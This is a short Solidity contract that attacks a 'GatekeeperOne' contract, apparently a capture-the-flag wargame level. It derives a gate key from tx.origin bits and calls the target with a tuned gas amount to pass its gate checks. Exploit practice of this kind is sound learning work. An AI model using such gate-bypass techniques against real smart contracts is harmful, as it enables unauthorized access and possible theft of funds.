// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne private target;

    event FoundValue(uint256 value);

    function forceEnter(address _addr, uint256 gas) external {
        target = GatekeeperOne(_addr);
        /*
        k = uint64(_gateKey);
        1. uint32(k) = uint16(k)
        2. uint32(k) != k
        4. uint32(k) = uint16(uint160(tx.origin))
        */
        // 1. uint32(k) = uint16(k)
        uint16 k16 = uint16(uint160(tx.origin));
        // 2. uint32(k) != k
        // uint64(1) = 0x00000000...1
        // uint64(1 << 64) = 0x100000....
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: (8191 * 3) + 150 + gas}(key), "failed");
    }
}
